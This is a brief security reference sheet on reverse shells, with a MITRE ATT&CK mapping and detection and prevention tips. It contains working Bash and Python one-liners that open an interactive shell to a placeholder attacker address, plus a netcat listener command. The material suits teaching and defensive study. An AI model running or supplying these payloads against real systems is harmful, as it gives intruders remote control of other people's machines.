# Reverse Shells

## Description
A reverse shell is a type of shell in which the target machine initiates the connection back to the attacker's machine, bypassing firewall restrictions.

---

## 💥 Common Payloads

### Bash
```bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
```

### Python
```python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ATTACKER-IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Netcat Listener
```bash
nc -lvnp <PORT>
```

---

## 🗺️ MITRE ATT&CK

| Technique | ID |
|-----------|----|
| Command & Scripting Interpreter | T1059 |
| Ingress Tool Transfer | T1105 |

---

## 🔵 Detection

- Monitor for outbound connections from web servers
- Alert on unexpected TCP connections to external IPs
- Detect `/bin/sh` or `/bin/bash` spawned from web processes

---

## 🛡️ Prevention

- Restrict outbound connections via firewall rules
- Use network segmentation
- Monitor and alert on unusual outbound traffic
